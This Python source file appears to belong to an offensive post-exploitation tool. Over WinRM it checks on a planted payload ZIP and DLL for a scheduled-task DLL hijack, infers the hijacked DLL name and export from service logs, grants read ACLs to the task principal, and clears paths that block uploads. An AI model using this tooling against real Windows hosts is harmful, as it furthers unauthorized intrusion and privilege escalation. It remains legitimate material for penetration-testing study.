from __future__ import annotations

import json
import re
from pathlib import Path

from admapper.postex.creds import resolve_winrm_cred
from admapper.postex.task_run_as import resolve_task_run_as
from admapper.postex.evil_winrm_output import extract_winrm_command_body
from admapper.support.output import print_error, print_info, print_success, print_warning
from admapper.support.session import Session
from admapper.winrm.client import WinRMClient, WinRMError
from admapper.winrm.factory import winrm_client_for_cred

_APPLIER_DLL_RE = re.compile(
    r"Loading update applier:\s*([A-Z]:\\(?:[^|\r\n]+?)\.dll)",
    re.IGNORECASE,
)
_EXPORT_NOT_FOUND_RE = re.compile(
    r"'([^']+)'\s+not found in\s+[\w.\\:/-]+\.dll",
    re.IGNORECASE,
)


def _clean_winrm_text(text: str) -> str:
    return extract_winrm_command_body(text).strip()


def _win_basename(path: str) -> str:
    normalized = path.strip().replace("/", "\\")
    if "\\" in normalized:
        return normalized.rsplit("\\", 1)[-1]
    return normalized


def infer_applier_dll_name(monitor_log: str) -> str | None:
    """Parse ``Loading update applier: ...\\foo.dll`` from service log lines."""
    for line in monitor_log.splitlines():
        match = _APPLIER_DLL_RE.search(line)
        if match:
            return _win_basename(match.group(1))
    return None


def resolve_monitor_log_path(scan: dict, drop_path: str) -> str | None:
    """Monitor log path from scan intel only — no lab-specific defaults."""
    top = str(scan.get("monitor_log_path") or "").strip()
    if top:
        return top
    intel = scan.get("hijack_intel")
    if isinstance(intel, dict):
        hinted = str(intel.get("monitor_log_path") or "").strip()
        if hinted:
            return hinted
    excerpt = str(scan.get("monitor_log_excerpt") or "")
    for line in excerpt.splitlines():
        if ".log" not in line.lower():
            continue
        for part in line.split():
            cleaned = part.strip("'\".,")
            if cleaned.lower().endswith(".log") and ":\\" in cleaned:
                return cleaned
    return None


def build_monitor_log_script(intel_path: str | None, drop_path: str) -> str:
    candidates: list[str] = []
    if intel_path:
        candidates.append(intel_path.replace("'", "''"))
    base = drop_path.rstrip("\\/")
    candidates.extend(
        [
            f"{base}\\Logs\\monitor.log",
            f"{base}\\Logs\\app.log",
            f"{base}\\Logs\\service.log",
            f"{base}\\Logs\\error.log",
            f"{base}\\monitor.log",
            f"{base}\\app.log",
            f"{base}\\service.log",
        ]
    )
    seen: set[str] = set()
    checks: list[str] = []
    for path in candidates:
        key = path.lower()
        if key in seen:
            continue
        seen.add(key)
        checks.append(
            f"if(Test-Path -LiteralPath '{path}')"
            f"{{Get-Content -LiteralPath '{path}' -Tail 25;break}}"
        )
    return ";".join(checks) if checks else "Write-Output 'no monitor log path'"


def read_monitor_log(client: WinRMClient, script: str) -> str:
    try:
        proc = client.execute(script, shell="powershell")
        return _clean_winrm_text(proc.stdout or "")
    except Exception:
        return ""


def monitor_log_shows_new_activity(current: str, baseline: str) -> bool:
    """True when the polled tail contains lines absent from the post-upload snapshot."""
    if not current or current == "no monitor log path":
        return False
    cur_lines = [ln.strip() for ln in current.splitlines() if ln.strip()]
    if not cur_lines:
        return False
    base_lines = [ln.strip() for ln in baseline.splitlines() if ln.strip()]
    if not base_lines:
        return False
    base_set = set(base_lines)
    return any(ln not in base_set for ln in cur_lines)


def resolve_hijack_payload_names(finding: dict, scan: dict) -> tuple[str, str]:
    """Prefer monitor-log applier DLL, then ``hijack_intel``, then op finding."""
    hi = scan.get("hijack_intel") if isinstance(scan.get("hijack_intel"), dict) else {}
    excerpt = str(scan.get("monitor_log_excerpt") or "")
    zip_name = str(hi.get("payload_zip") or finding.get("payload_zip") or "payload.zip").strip()
    dll_name = (
        infer_applier_dll_name(excerpt)
        or str(hi.get("payload_dll") or "").strip()
        or str(finding.get("payload_dll") or "").strip()
        or "payload.dll"
    )
    return zip_name, dll_name


def infer_export_name_from_monitor_log(monitor_log: str) -> str | None:
    """Parse ``'PreUpdateCheck' not found in settings_update.dll`` style lines."""
    for line in monitor_log.splitlines():
        match = _EXPORT_NOT_FOUND_RE.search(line)
        if match:
            return match.group(1).strip()
    return None


def export_name_for_dll(dll_name: str, *, monitor_log: str = "") -> str:
    """DLL export invoked by the service — not always the same as the ``.dll`` stem."""
    inferred = infer_export_name_from_monitor_log(monitor_log)
    if inferred:
        return inferred
    # Generic scheduled-task hijack export (see hijack_detection.md).
    return "PreUpdateCheck"


def remote_file_status(client: WinRMClient, remote_path: str) -> str:
    safe = remote_path.replace("'", "''")
    script = (
        f"if(-not(Test-Path -LiteralPath '{safe}')){{Write-Output 'MISSING';exit}};"
        f"$i=Get-Item -LiteralPath '{safe}';"
        f'Write-Output ("MODE="+$i.Mode+" LENGTH="+$i.Length)'
    )
    try:
        proc = client.execute(script, shell="powershell", timeout=60)
        body = _clean_winrm_text(proc.stdout or "")
        for line in body.splitlines():
            if line.startswith("MODE="):
                return line.strip()
        return body or "(empty stdout)"
    except WinRMError as exc:
        return f"WinRM error: {exc}"


def remediate_remote_zip_path(client: WinRMClient, remote_path: str) -> bool:
    """Delete a directory occupying the remote ZIP file path."""
    safe = remote_path.replace("'", "''")
    script = (
        f"$p='{safe}';"
        "if(Test-Path -LiteralPath $p){"
        "$i=Get-Item -LiteralPath $p;"
        "if($i.PSIsContainer){"
        "Remove-Item -LiteralPath $p -Recurse -Force;"
        "Write-Output 'ADMAPPER_REMOVED_DIR'}}"
    )
    try:
        proc = client.execute(script, shell="powershell", timeout=60)
        body = _clean_winrm_text(proc.stdout or "")
    except WinRMError:
        return False
    if "ADMAPPER_REMOVED_DIR" in body:
        print_success(f"removed directory blocking upload → {remote_path}")
        return True
    return False


def remote_acl_summary(client: WinRMClient, remote_path: str) -> str:
    safe = remote_path.replace('"', '\\"')
    try:
        proc = client.execute(f'icacls "{safe}"', shell="cmd", timeout=60)
        body = _clean_winrm_text(proc.stdout or "")
        lines = [ln.strip() for ln in body.splitlines() if ln.strip() and not ln.startswith("Successfully")]
        return " | ".join(lines[:4]) if lines else "(no acl output)"
    except WinRMError as exc:
        return f"WinRM error: {exc}"


def grant_task_read_acl(
    client: WinRMClient,
    remote_path: str,
    *,
    domain: str,
    run_as_user: str,
) -> None:
    """Let the scheduled-task principal read a payload uploaded by another WinRM user."""
    remote_bs = remote_path.replace("/", "\\")
    principals: list[str] = []
    user = run_as_user.strip().rstrip("$")
    skip = frozenset({"unknown", "system", "localservice", "networkservice"})
    if user and user.lower() not in skip:
        principals.append(user if "\\" in user else f"{domain}\\{user}")
    principals.append("Users")
    safe_path = remote_bs.replace('"', '\\"')
    for principal in principals:
        try:
            client.execute(
                f'icacls "{safe_path}" /grant "{principal}:(R)"',
                shell="cmd",
                timeout=60,
            )
        except WinRMError:
            continue
    print_info(f"upload: granted read ACL to {', '.join(principals)}")


def print_postex_diagnostics(
    session: Session,
    *,
    host: str | None = None,
    cred_id: str | None = None,
    tail: int = 25,
    fix: bool = False,
) -> None:
    """Print remote payload path status and service log tail (fast WinRM diagnostics)."""
    if session.workspace is None:
        print_error("no active workspace")
        return

    ws_path = session.workspaces.path_for(session.workspace.name)
    scan_path = ws_path / "postex_scan.json"
    scan: dict = {}
    if scan_path.is_file():
        try:
            scan = json.loads(scan_path.read_text(encoding="utf-8"))
        except (OSError, json.JSONDecodeError):
            scan = {}

    finding = (scan.get("findings") or [{}])[0]
    drop_path = str(finding.get("drop_path") or r"C:\ProgramData")
    zip_name, dll_name = resolve_hijack_payload_names(finding, scan)
    remote_zip = f"{drop_path.rstrip(chr(92))}\\{zip_name}"
    monitor_path = resolve_monitor_log_path(scan, drop_path)

    try:
        cred = resolve_winrm_cred(
            session,
            shell_user=str(scan.get("shell_user") or "") or None,
            cred_id=cred_id,
            host=host or str(scan.get("dc_ip") or "") or None,
        )
    except ValueError as exc:
        print_error(str(exc))
        return

    client = winrm_client_for_cred(cred, session)
    task_user = resolve_task_run_as(scan, finding, ws_path=ws_path)
    print_info(f"target: {cred.host} as {cred.domain}\\{cred.username}")
    print_info(f"task run-as (for ACL): {task_user}")
    print_info(f"payload DLL name (intel): {dll_name}")
    print_info(f"remote ZIP: {remote_zip}")
    status = remote_file_status(client, remote_zip)
    print_info(f"remote ZIP status: {status}")
    if status.startswith("MODE=-a----"):
        print_info(f"remote ZIP ACL: {remote_acl_summary(client, remote_zip)}")
    if "d-----" in status or "d----" in status.lower():
        print_warning("remote path is a DIRECTORY — blocks ZIP upload")
        if fix:
            remediate_remote_zip_path(client, remote_zip)
            print_info(f"remote ZIP status (after --fix): {remote_file_status(client, remote_zip)}")
        else:
            print_info("run: admapper postex logs -w <workspace> --fix  (or postex run — auto-fixes)")

    if monitor_path:
        print_info(f"monitor log: {monitor_path}")
        safe = monitor_path.replace("'", "''")
        try:
            proc = client.execute(
                f"if(Test-Path -LiteralPath '{safe}')"
                f"{{Get-Content -LiteralPath '{safe}' -Tail {int(tail)}}}"
                f"else{{Write-Output '(log not found)'}}",
                shell="powershell",
                timeout=60,
            )
            body = _clean_winrm_text(proc.stdout or "")
        except WinRMError as exc:
            body = f"(read failed: {exc})"
    else:
        print_warning("monitor_log_path unknown — run: admapper postex scan -w <workspace>")
        script = build_monitor_log_script(None, drop_path)
        body = read_monitor_log(client, script)

    export = export_name_for_dll(dll_name)
    print_info(f"expected DLL export: {export}")

    body = _clean_winrm_text(body)
    if status.startswith("MODE=-a----") and "no updates found locally" in body.lower():
        print_warning(
            "ZIP exists but monitor log still reports no local update — "
            f"uploaded as {cred.domain}\\{cred.username}, task runs as {task_user}; "
            "re-run postex run to grant read ACL or wait for next ~3min task cycle"
        )
    if body:
        print_info("service log (tail):")
        for line in body.splitlines():
            if line.strip():
                print_info(f"  {line}")
    else:
        print_warning("service log empty or unreadable")
